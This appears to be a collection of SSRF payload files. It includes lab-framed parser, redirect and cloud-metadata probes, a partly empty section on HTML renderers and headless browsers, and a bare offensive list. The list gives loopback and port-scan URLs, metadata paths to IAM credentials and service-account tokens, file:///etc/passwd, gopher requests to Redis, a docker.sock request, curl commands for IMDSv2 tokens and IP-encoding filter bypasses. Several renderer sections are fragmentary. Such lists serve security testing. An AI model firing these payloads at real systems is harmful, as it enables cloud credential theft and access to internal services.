sections.label: SSRF Parser, Redirect and Cloud Context Payloads
Controlled callback paths: a server-side marker callback proves a request, not internal data exposure
Redirect chain: configure each location on the controlled redirect server, then observe each hop
URL parser / normalization controls; library acceptance varies, so record parsed host and connected peer
DNS rebinding sequence: controlled DNS zone and private mock server only
In a mock metadata service, send GET /computeMetadata/v1/instance/id with the header below.
Azure metadata context: harmless instance metadata, mock service first
AWS IMDSv2 sequence: mock PUT issues a synthetic token; GET requires that token
Request 2: GET /latest/meta-data/instance-id using the mock token header.
Lab fetcher JSON: only relevant when the application actually exposes method/header configuration
Processing entry points: independently verify which component made the request using fixture logs

files.content: # SSRF Parser, Redirect and Cloud Context Payloads # Controlled callback paths: a server-side marker callback proves a request, not internal data exposure https://collector.example.test/ssrf/direct-marker https://collector.example.test/ssrf/pdf-marker https://collector.example.test/ssrf/image-marker {"url":"https://collector.example.test/ssrf/webhook-marker","event":"ssrf-lab-control"} # Redirect chain: configure each location on the controlled redirect server, then observe each hop https://redirect.example.test/ssrf/one-hop-to-loopback https://redirect.example.test/ssrf/two-hops-to-loopback https://redirect.example.test/ssrf/redirect-to-ipv6 https://redirect.example.test/ssrf/scheme-change # URL parser / normalization controls; library acceptance varies, so record parsed host and connected peer http://127.1:8080/ssrf-lab/identity http://0177.0.0.1:8080/ssrf-lab/identity http://2130706433:8080/ssrf-lab/identity http://[::ffff:7f00:1]:8080/ssrf-lab/identity http://[0:0:0:0:0:ffff:7f00:1]:8080/ssrf-lab/identity http://localhost.:8080/ssrf-lab/identity http://allowed.example.test@127.0.0.1:8080/ssrf-lab/identity http://127.0.0.1:8080/ssrf-lab/identity#allowed.example.test http://allowed.example.test\@127.0.0.1:8080/ssrf-lab/identity # DNS rebinding sequence: controlled DNS zone and private mock server only http://rebind.example.test:8080/ssrf-lab/dns-marker # In a mock metadata service, send GET /computeMetadata/v1/instance/id with the header below. Metadata-Flavor: Google http://metadata.google.internal/computeMetadata/v1/instance/id # Azure metadata context: harmless instance metadata, mock service first Metadata: true http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01&format=json # AWS IMDSv2 sequence: mock PUT issues a synthetic token; GET requires that token X-aws-ec2-metadata-token-ttl-seconds: 60 # Request 2: GET /latest/meta-data/instance-id using the mock token header. X-aws-ec2-metadata-token: LAB_IMDSV2_TOKEN http://169.254.169.254/latest/meta-data/instance-id http://[fd00:ec2::254]/latest/meta-data/instance-id # Lab fetcher JSON: only relevant when the application actually exposes method/header configuration {"url":"http://metadata-mock.example.test/computeMetadata/v1/instance/id","method":"GET","headers":{"Metadata-Flavor":"Google"}} {"url":"http://metadata-mock.example.test/metadata/instance/compute?api-version=2021-02-01&format=json","method":"GET","headers":{"Metadata":"true"}} {"url":"http://metadata-mock.example.test/latest/api/token","method":"PUT","headers":{"X-aws-ec2-metadata-token-ttl-seconds":"60"}} {"url":"http://metadata-mock.example.test/latest/meta-data/instance-id","method":"GET","headers":{"X-aws-ec2-metadata-token":"LAB_IMDSV2_TOKEN"}} # Processing entry points: independently verify which component made the request using fixture logs

files.name: headless-renderer-payloads.txt

sections.label: SSRF via HTML/PDF Renderers, Headless Browsers and Document Converters
Basic outbound-interaction probes (HTML content rendered server-side)
JavaScript in the renderer: read internal responses and send them out
Local file read through the renderer (file:// handling differs per tool)
DNS rebinding and redirect-based bypass of an allow-list that checks only the first URL
redirect fixture: respond 302 with Location: http://169.254.169.254/latest/meta-data/ (observe whether the renderer follows)
wkhtmltopdf (legacy WebKit): local file inclusion via XHR and iframe (version-dependent behaviour)
Headless Chrome / Puppeteer / Playwright: navigation and DevTools exposure
Link preview / unfurl / URL import fetchers (server fetches a URL and parses metadata)
SVG, XML and document formats that trigger fetches
ImageMagick / Ghostscript / ffmpeg delegates reaching the network (see also Command-Injection/argument-injection-payloads.txt)

files.content:
# SSRF via HTML/PDF Renderers, Headless Browsers and Document Converters # Content processed server-side by a browser engine or converter. Place in a field that is rendered to PDF/image or fetched for a preview. Replace oast.example.test. # Basic outbound-interaction probes (HTML content rendered server-side)
x
# JavaScript in the renderer: read internal responses and send them out # Local file read through the renderer (file:// handling differs per tool) # Cloud metadata via the renderer # DNS rebinding and redirect-based bypass of an allow-list that checks only the first URL # redirect fixture: respond 302 with Location: http://169.254.169.254/latest/meta-data/ (observe whether the renderer follows) # wkhtmltopdf (legacy WebKit): local file inclusion via XHR and iframe (version-dependent behaviour) --disable-local-file-access # Headless Chrome / Puppeteer / Playwright: navigation and DevTools exposure chrome://version about:blank view-source:http://127.0.0.1/ http://127.0.0.1:9222/json http://127.0.0.1:9222/json/version http://localhost:9222/json/list ws://127.0.0.1:9222/devtools/browser/ http://127.0.0.1:9229/json javascript:document.title='render-marker' data:text/html, --remote-debugging-port=9222 --no-sandbox --disable-web-security --allow-file-access-from-files # Link preview / unfurl / URL import fetchers (server fetches a URL and parses metadata) http://oast.example.test/preview http://oast.example.test/preview.html with http://oast.example.test/preview.html with http://oast.example.test/oembed.json http://oast.example.test/feed.xml http://oast.example.test/sitemap.xml http://oast.example.test/redirect-to-internal http://oast.example.test/slow-response (hold the connection open to detect timeouts) http://oast.example.test/large-response (large body to detect size limits) # SVG, XML and document formats that trigger fetches

# SSRF (Server-Side Request Forgery) Payloads

# Basic SSRF
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://[::]

# Port scanning
http://127.0.0.1:22
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:3306
http://127.0.0.1:5432
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:27017

# Cloud metadata endpoints
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Digital Ocean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id

# Internal network scanning
http://192.168.0.1
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1

# Protocol handlers
file:///etc/passwd
file:///c:/windows/win.ini
dict://127.0.0.1:11211/
gopher://127.0.0.1:6379/_INFO
ldap://127.0.0.1:389
tftp://127.0.0.1:69

# Bypassing filters
# Using decimal IP (127.0.0.1 in decimal)
http://2130706433
# Using decimal IP (192.168.0.1 in decimal)
http://3232235521

# Using octal IP
http://0177.0.0.1
http://0x7f.0x0.0x0.0x1

# Using hex IP
http://0x7f000001
http://0x7f.0x0.0x0.0x1

# DNS rebinding
http://spoofed.burpcollaborator.net

# URL encoding
http://127.0.0.1%23@example.com
http://example.com@127.0.0.1
http://127.0.0.1%00.example.com
http://127.0.0.1%2f%2f@example.com

# IPv6 localhost
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[0000:0000:0000:0000:0000:0000:0000:0001]

# Redirect-based SSRF
http://redirect.example.com?url=http://127.0.0.1

# AWS IMDSv2 (requires token)
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Advanced cloud metadata & instance identity
http://169.254.169.254/latest/dynamic/instance-identity/signature
http://metadata.google.internal/computeMetadata/v1/oslogin/
http://[fd00:ec2::254]/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/attacker-role

# Numeric / encoded host bypasses (additional forms)
http://2130706433:80
http://017700000001
https://0x7f000001
http://[::ffff:127.0.0.1]:8080

# Additional protocol handlers
ftp://127.0.0.1
tftp://[::1]:69
gopher://localhost:11211/_stats%0d%0a
http://%2f%2fvar%2frun%2fdocker.sock/containers/json

# Expanded internal network ranges
http://10.0.0.0
http://172.16.0.0
http://192.168.0.0
http://169.254.0.0
